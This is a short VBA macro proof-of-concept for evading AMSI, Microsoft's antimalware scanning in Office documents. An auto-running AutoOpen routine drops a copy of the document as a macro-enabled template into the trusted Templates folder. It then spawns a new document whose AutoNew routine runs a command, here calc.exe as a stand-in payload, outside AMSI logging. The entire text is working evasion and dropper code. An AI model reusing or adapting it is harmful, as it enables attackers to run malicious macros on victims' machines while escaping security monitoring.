Sub autoopen()
'function called by the initial 'dropper' code, drops a dotm into %appdata\microsoft templates
curfile = ActiveDocument.Path & "\" & ActiveDocument.Name
templatefile = Environ("appdata") & "\Microsoft\Templates\" & DateDiff("s", #1/1/1970#, Now()) & ".dotm"

ActiveDocument.SaveAs2 FileName:=templatefile, FileFormat:=wdFormatXMLTemplateMacroEnabled, AddToRecentFiles:=True
 
' save back to orig location, otherwise AMSI will kcik in (as we are the template)
ActiveDocument.SaveAs2 FileName:=curfile, FileFormat:=wdFormatXMLDocumentMacroEnabled
    
' now create a new file based on template
Documents.Add Template:=templatefile, NewTemplate:=False, DocumentType:=0
End Sub

Sub autonew()
    ' this function is called from a trusted location, not in the AMSI logs
    Shell "calc.exe"
End Sub
